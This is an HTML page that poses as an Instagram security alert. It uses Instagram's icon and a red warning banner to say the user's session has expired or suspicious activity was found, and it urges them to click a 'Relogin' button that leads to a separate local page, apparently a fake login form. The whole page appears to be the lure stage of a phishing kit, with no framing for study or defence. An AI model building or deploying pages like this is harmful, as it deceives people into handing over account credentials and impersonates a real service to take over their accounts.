<!DOCTYPE html>
<html>
<head>
<title>Security Alert</title>
<style>
body{
    font-family: Arial, sans-serif;
    background: linear-gradient(to right, #ff0000, #ffcc00);
    text-align:center;
    padding-top:100px;
}

.box{
    background:white;
    width:400px;
    margin:auto;
    padding:30px;
    border-radius:10px;
    box-shadow:0px 0px 10px gray;
}

h1{
    color:red;
}

button{
    background:#ff0000;
    color:white;
    border:none;
    padding:12px 25px;
    font-size:16px;
    border-radius:5px;
    cursor:pointer;
}

button:hover{
    background:#cc0000;
}
</style>
</head>

<body>

<div class="box">

<img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" width="80">

<h1>Security Alert!</h1>

<p>Your Instagram session has expired or suspicious activity was detected.</p>

<p>Please login again to continue using your account.</p>

<br>

<button onclick="window.location.href='1.html'">
Click Here to Relogin
</button>

</div>

</body>
</html>
